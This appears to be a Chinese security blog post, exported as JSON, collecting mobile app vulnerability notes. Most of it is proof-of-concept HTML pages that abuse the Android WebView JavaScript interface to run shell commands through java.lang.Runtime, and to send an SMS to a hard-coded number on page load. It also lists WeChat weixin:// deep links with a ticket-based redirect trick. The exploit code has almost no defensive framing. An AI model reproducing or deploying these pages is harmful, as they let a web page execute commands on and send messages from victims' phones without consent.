{"title":"移动app漏洞收集(待整理)","slug":"网安大类/OWASPTOP/MobileApp/移动app漏洞收集","date":"2019-06-17T05:36:30.000Z","updated":"2022-04-13T02:35:17.672Z","url":"2019/6-17-381.html","path":"api/articles/2019/6-17-381.html.json","covers":null,"content":"<p><a href=\"http://www.anquan.us/static/bugs/wooyun-2015-0114241.html\" target=\"_blank\" rel=\"noopener\">http://www.anquan.us/static/bugs/wooyun-2015-0114241.html</a><br>  pageid: </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    &lt;html&gt;</span><br><span class=\"line\">       &lt;body&gt;</span><br><span class=\"line\">          &lt;script&gt;</span><br><span class=\"line\">             <span class=\"keyword\">function</span> execute(cmdArgs)</span><br><span class=\"line\">             &#123;</span><br><span class=\"line\">                 <span class=\"built_in\">return</span> injectedObj.getClass().forName(<span class=\"string\">\"java.lang.Runtime\"</span>).getMethod(<span class=\"string\">\"getRuntime\"</span>,null).invoke(null,null).<span class=\"built_in\">exec</span>(cmdArgs);</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">             var res = execute([<span class=\"string\">\"/system/bin/sh\"</span>, <span class=\"string\">\"-c\"</span>, <span class=\"string\">\"ls -al /mnt/sdcard/\"</span>]);</span><br><span class=\"line\">             document.write(getContents(res.getInputStream()));</span><br><span class=\"line\">           &lt;/script&gt;</span><br><span class=\"line\">       &lt;/body&gt;</span><br><span class=\"line\">    &lt;/html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">这个是执行命令的poc</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;html&gt;</span><br><span class=\"line\">    &lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;Test send&lt;/title&gt;</span><br><span class=\"line\">    &lt;script <span class=\"built_in\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><br><span class=\"line\">    <span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">execute</span></span>() &#123;</span><br><span class=\"line\">        var sendsms = jsInterface.getClass().forName(<span class=\"string\">\"android.telephony.SmsManager\"</span>).getMethod(<span class=\"string\">\"getDefault\"</span>,null),invoke(null,null);</span><br><span class=\"line\">        sendsms.sendTextMessage(<span class=\"string\">\"13722555165\"</span>,null,<span class=\"string\">\"get\"</span>,null,null);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &lt;/script&gt;</span><br><span class=\"line\">    &lt;/head&gt;</span><br><span class=\"line\">    &lt;body onload=<span class=\"string\">\"execute()\"</span>&gt;</span><br><span class=\"line\">    &lt;input <span class=\"built_in\">type</span>=<span class=\"string\">\"button\"</span> onclick=<span class=\"string\">\"=\"</span>execute<span class=\"string\">\" value=\"</span><span class=\"built_in\">test</span><span class=\"string\">\"/&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/html&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;head&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;title&gt;Test sendsms&lt;/title&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;script type=\"</span>text/javascript<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    function execute() &#123;</span></span><br><span class=\"line\"><span class=\"string\">        var sendsms = jsInterface.getClass().forName(\"</span>android.telephony.SmsManager<span class=\"string\">\").getMethod(\"</span>getDefault<span class=\"string\">\",null),invoke(null,null);</span></span><br><span class=\"line\"><span class=\"string\">        sendsms.sendTextMessage(\"</span>13722555165<span class=\"string\">\",null,\"</span>get<span class=\"string\">\",null,null);</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;body onload=\"</span>execute()<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;input type=\"</span>button<span class=\"string\">\" onclick=\"</span>=<span class=\"string\">\"execute\"</span> value=<span class=\"string\">\"test\"</span>/&gt;</span><br><span class=\"line\">    &lt;/body&gt;</span><br><span class=\"line\">    &lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.jianshu.com/p/2c6c55b48238\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/2c6c55b48238</a></p>\n<p>出售API的<br><a href=\"http://vip.wxticket.com/\" target=\"_blank\" rel=\"noopener\">http://vip.wxticket.com/</a></p>\n<p>weixin的协议<br>weixin://看了官方的文档之后我发现了微信支持如下操作</p>\n<pre><code>weixin://dl/general\nweixin://dl/favorites 收藏\nweixin://dl/scan 扫一扫\nweixin://dl/feedback 反馈\nweixin://dl/moments 朋友圈\nweixin://dl/settings 设置\nweixin://dl/notifications 消息通知设置\nweixin://dl/chat 聊天设置\nweixin://dl/general 通用设置\nweixin://dl/officialaccounts 公众号\nweixin://dl/games 游戏\nweixin://dl/help 帮助\nweixin://dl/feedback 反馈\nweixin://dl/profile 个人信息\nweixin://dl/features 功能插件\n</code></pre><p>经过一番查找我找到了能够跳转的方法<br>weixin://dl/business/?ticket=xxxxxxxxxxxxxxxxx 打开小xx网站的时候突然弹出的微信是什么鬼</p>\n<p>果然是我想象得那样<br>weixin://dl/business/?ticket=taa597ccdcdf00ecb865d9e04904bbff4<br>我们手机打开一下我得测试网页<br><a href=\"weixin://dl/business/?ticket=taa597ccdcdf00ecb865d9e04904bbff4\">demo</a><br>成功打开微信并跳转~~~~</p>\n","comments":true,"excerpt":null,"categories":[{"name":"移动终端漏洞","path":"api/categories/移动终端漏洞.json"}],"tags":[{"name":"MobileApp","path":"api/tags/MobileApp.json"}]}